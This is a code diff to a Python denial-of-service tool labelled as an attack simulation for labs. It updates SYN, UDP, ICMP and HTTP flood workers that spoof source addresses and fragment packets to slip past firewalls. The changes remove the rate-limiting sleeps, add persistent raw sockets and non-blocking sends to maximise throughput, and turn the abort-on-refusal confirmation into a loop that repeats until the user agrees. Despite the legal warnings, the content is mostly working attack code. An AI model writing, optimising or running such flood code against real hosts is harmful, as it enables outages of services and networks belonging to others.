@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ===========================================================================
-  Advanced Cyber Attack Tool
+  KALI DADA — Advanced Cyber Attack Simulation Tool
 ===========================================================================
   Author  : Sujal Lamichhane
   Website : sujallamichhane.com.np
@@ -12,7 +12,7 @@
   AUTHORISATION is a criminal offence under:
     • Computer Fraud and Abuse Act (CFAA) — USA
     • Computer Misuse Act — UK
-    • IT Act 2063 — Nepal
+    • IT Act 2000 — Nepal / India
     • And equivalent laws worldwide.
   The author bears ZERO responsibility for any misuse.
 ===========================================================================
@@ -91,10 +91,10 @@ def print_warning():
     print(f"""
 {C.RED}{C.BOLD}
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║                      ⚠   L E G A L   W A R N I N G   ⚠                      ║
+║                      ⚠   L E G A L   W A R N I N G   ⚠                    ║
 ╠══════════════════════════════════════════════════════════════════════════════╣
 ║                                                                              ║
-║  THIS TOOL IS FOR EDUCATIONAL AND AUTHORISED LAB USE ONLY.                   ║
+║  THIS TOOL IS FOR EDUCATIONAL AND AUTHORISED LAB USE ONLY.                  ║
 ║                                                                              ║
 ║  • Do NOT use this against any system you do not own or have written         ║
 ║    permission to test.                                                       ║
@@ -112,7 +112,7 @@ def print_banner():
     print(f"""{C.GREEN}{C.BOLD}
  /$$   /$$  /$$$$$$  /$$       /$$$$$$        /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$
 | $$  /$$/ /$$__  $$| $$      |_  $$_/       | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
-| $$ /$$/ | $$  \\$$| $$        | $$         | $$  \\ $$| $$  \\ $$| $$  \\ $$| $$ \\$$
+| $$ /$$/ | $$  \\$$| $$        | $$         | $$  \\ $$| $$  \\ $$| $$  \\ $$| $$  \\ $$
 | $$$$$/  | $$$$$$$$| $$        | $$         | $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$
 | $$  $$  | $$__  $$| $$        | $$         | $$  | $$| $$__  $$| $$  | $$| $$__  $$
 | $$\\ $$  | $$  | $$| $$        | $$         | $$  | $$| $$  | $$| $$  | $$| $$  | $$
@@ -264,6 +264,13 @@ def _syn_flood_worker(target_ip: str, target_port: int, end_time: float):
     Security concept: SYN cookies (RFC 4987) are the primary defence
     against this attack on modern Linux kernels.
     """
+    # Persistent L3 socket per thread — avoids per-packet socket open/close overhead
+    try:
+        sock = conf.L3socket()
+    except Exception as e:
+        log("ERROR", f"Failed to open raw socket: {e}")
+        return
+
     while time.time() < end_time and not stop_event.is_set():
         try:
             src_ip    = random_ipv4()
@@ -291,18 +298,21 @@ def _syn_flood_worker(target_ip: str, target_port: int, end_time: float):
 
             # Fragment to evade shallow-inspection firewalls
             for frag in fragment(pkt, fragsize=500):
-                send(frag, verbose=False)
+                sock.send(frag)
 
             with count_lock:
                 packet_count[0]  += 1
                 success_count[0] += 1
 
-            time.sleep(random.uniform(0.001, 0.005))
-
         except Exception:
             with count_lock:
                 packet_count[0] += 1
                 error_count[0]  += 1
+
+    try:
+        sock.close()
+    except Exception:
+        pass
 
 
 def advanced_syn_flood(target_ip: str, target_port: int, duration: int, num_threads: int):
@@ -363,49 +373,56 @@ def _udp_flood_worker(target_ip: str, target_port: int, end_time: float, use_sca
     by ingress filtering (BCP38), rate limiting per source IP.
     """
     if use_scapy:
+        # Persistent L3 socket per thread for maximum throughput
+        try:
+            sock = conf.L3socket()
+        except Exception as e:
+            log("ERROR", f"Failed to open raw socket: {e}")
+            return
+
         while time.time() < end_time and not stop_event.is_set():
             try:
                 src_ip   = random_ipv4()
                 src_port = random.randint(1024, 65535)
-                size     = random.randint(64, 1400)
-                payload  = bytes(random.getrandbits(8) for _ in range(size))
+                payload  = os.urandom(random.randint(64, 1400))   # os.urandom is faster
 
                 pkt = IP(src=src_ip, dst=target_ip) / UDP(
                     sport=src_port, dport=target_port
                 ) / Raw(load=payload)
 
-                send(pkt, verbose=False)
+                sock.send(pkt)
 
                 with count_lock:
                     packet_count[0]  += 1
                     success_count[0] += 1
-
-                time.sleep(random.uniform(0.001, 0.005))
 
             except Exception:
                 with count_lock:
                     packet_count[0] += 1
                     error_count[0]  += 1
+
+        try:
+            sock.close()
+        except Exception:
+            pass
     else:
         # Faster OS-socket path (no spoofing, but higher throughput)
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setblocking(False)
         except Exception as e:
             log("ERROR", f"UDP socket creation failed: {e}")
             return
 
+        target = (target_ip, target_port)
         while time.time() < end_time and not stop_event.is_set():
             try:
-                size    = random.randint(64, 1500)
-                payload = os.urandom(size)
-                sock.sendto(payload, (target_ip, target_port))
-
+                sock.sendto(os.urandom(random.randint(64, 1500)), target)
                 with count_lock:
                     packet_count[0]  += 1
                     success_count[0] += 1
-
-                time.sleep(random.uniform(0.0005, 0.003))
-
+            except BlockingIOError:
+                pass   # send buffer full — skip and retry immediately
             except Exception:
                 with count_lock:
                     packet_count[0] += 1
@@ -468,11 +485,18 @@ def _icmp_flood_worker(target_ip: str, end_time: float):
     Security concept: Defended by ICMP rate limiting or complete ICMP
     blocking at the perimeter firewall.
     """
+    # Persistent L3 socket per thread
+    try:
+        sock = conf.L3socket()
+    except Exception as e:
+        log("ERROR", f"Failed to open raw socket: {e}")
+        return
+
     while time.time() < end_time and not stop_event.is_set():
         try:
             src_ip  = random_ipv4()
             seq_num = random.randint(0, 65535)
-            payload = os.urandom(random.randint(56, 1400))  # random-size payload
+            payload = os.urandom(random.randint(56, 1400))
 
             pkt = IP(src=src_ip, dst=target_ip) / ICMP(
                 type=8,    # Echo Request
@@ -480,18 +504,21 @@ def _icmp_flood_worker(target_ip: str, end_time: float):
                 seq=seq_num,
             ) / Raw(load=payload)
 
-            send(pkt, verbose=False)
+            sock.send(pkt)
 
             with count_lock:
                 packet_count[0]  += 1
                 success_count[0] += 1
 
-            time.sleep(random.uniform(0.001, 0.003))
-
         except Exception:
             with count_lock:
                 packet_count[0] += 1
                 error_count[0]  += 1
+
+    try:
+        sock.close()
+    except Exception:
+        pass
 
 
 def icmp_ping_flood(target_ip: str, duration: int, num_threads: int):
@@ -555,6 +582,7 @@ def _http_flood_worker(target_ip: str, target_port: int, end_time: float):
     ]
 
     while time.time() < end_time and not stop_event.is_set():
+        sock = None
         try:
             path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12))
             ua   = random.choice(user_agents)
@@ -569,10 +597,9 @@ def _http_flood_worker(target_ip: str, target_port: int, end_time: float):
             ).encode()
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
+            sock.settimeout(3)
             sock.connect((target_ip, target_port))
-            sock.send(request)
-            sock.close()
+            sock.sendall(request)
 
             with count_lock:
                 packet_count[0]  += 1
@@ -582,8 +609,12 @@ def _http_flood_worker(target_ip: str, target_port: int, end_time: float):
             with count_lock:
                 packet_count[0] += 1
                 error_count[0]  += 1
-
-        time.sleep(random.uniform(0.001, 0.005))
+        finally:
+            if sock:
+                try:
+                    sock.close()
+                except Exception:
+                    pass
 
 
 def http_get_flood(target_ip: str, target_port: int, duration: int, num_threads: int):
@@ -749,15 +780,15 @@ def main():
     print_warning()
     print_banner()
 
-    # Safety confirmation gate
+    # Safety confirmation gate — re-prompt until user confirms
     print(f"  {C.RED}{C.BOLD}⚠  CONFIRMATION REQUIRED{C.RESET}")
     print(f"  {C.WHITE}You must confirm this is a controlled lab environment.")
     print(f"  Unauthorised use against real targets is illegal.{C.RESET}\n")
-    confirm = input(f"  {C.YELLOW}Type 'I AGREE' to continue: {C.RESET}").strip()
-
-    if confirm != "I AGREE":
-        print(f"\n  {C.RED}Aborted. Confirmation not given.{C.RESET}\n")
-        sys.exit(0)
+    while True:
+        confirm = input(f"  {C.YELLOW}Type 'I AGREE' to continue: {C.RESET}").strip()
+        if confirm.upper() == "I AGREE":
+            break
+        print(f"  {C.RED}[!] Please type 'I AGREE' (case-insensitive) to proceed.{C.RESET}")
 
     check_root()
 
